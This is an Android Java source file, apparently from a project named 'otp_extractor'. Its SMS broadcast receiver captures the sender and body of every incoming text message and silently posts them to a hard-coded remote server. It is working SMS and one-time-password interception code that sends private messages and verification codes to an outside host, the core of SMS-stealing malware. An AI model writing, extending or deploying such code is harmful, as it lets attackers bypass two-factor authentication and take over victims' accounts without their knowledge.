package com.example.otp_extractor;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class SmsReceiver extends BroadcastReceiver {

    private static final String SERVER_URL = "https://remote-server-woad.vercel.app/data";
    private static final String TAG = "SmsReceiver";
    public static final MediaType JSON = MediaType.get("application/json; charset=utf-8");
    private final OkHttpClient client = new OkHttpClient(); // Create a single OkHttpClient instance

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction() != null && intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            Bundle bundle = intent.getExtras();
            SmsMessage[] smsMessages;
            String smsBody = "";
            String senderNum = "";

            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                if (pdus != null) {
                    smsMessages = new SmsMessage[pdus.length];
                    for (int i = 0; i < pdus.length; i++) {
                        smsMessages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                        senderNum = smsMessages[i].getOriginatingAddress();
                        smsBody = smsMessages[i].getMessageBody();
                        // If messages are long, they might be split into multiple PDUs
                        // You might want to concatenate smsBody if that's the case,
                        // but for OTPs it's usually short.
                    }
                    Log.d(TAG, "Message from: " + senderNum + " : " + smsBody);
                    sendSmsToServer(context, senderNum, smsBody);
                }
            }
        }
    }

    private void sendSmsToServer(Context context, String sender, String body) {
        JSONObject json = new JSONObject();
        try {
            json.put("sender", sender);
            json.put("body", body);
        } catch (JSONException e) {
            Log.e(TAG, "Failed to create JSON object", e);
            showToast(context, "Error creating data for server");
            return;
        }

        String jsonString = json.toString();
        RequestBody requestBody = RequestBody.create(jsonString, JSON);

        Request request = new Request.Builder()
                .url(SERVER_URL)
                .post(requestBody)
                .build();

        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                Log.e(TAG, "Failed to send SMS to server (OkHttp)", e);
                showToast(context, "Error sending SMS to server");
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                if (response.isSuccessful()) {
                    Log.d(TAG, "SMS sent to server successfully (OkHttp). Response: " + response.body().string());
                    // You can show a success toast if needed, but often background tasks are silent
                    // showToast(context, "SMS data sent to server");
                } else {
                    Log.e(TAG, "Failed to send SMS (OkHttp). Response code: " + response.code() + ", Message: " + response.message());
                    showToast(context, "Failed to send SMS to server");
                }
                // Make sure to close the response body to avoid resource leaks
                if (response.body() != null) {
                    response.body().close();
                }
            }
        });
    }

    private void showToast(Context context, final String message) {
        if (context != null) {
            new android.os.Handler(android.os.Looper.getMainLooper()).post(() ->
                    Toast.makeText(context, message, Toast.LENGTH_SHORT).show()
            );
        }
    }
}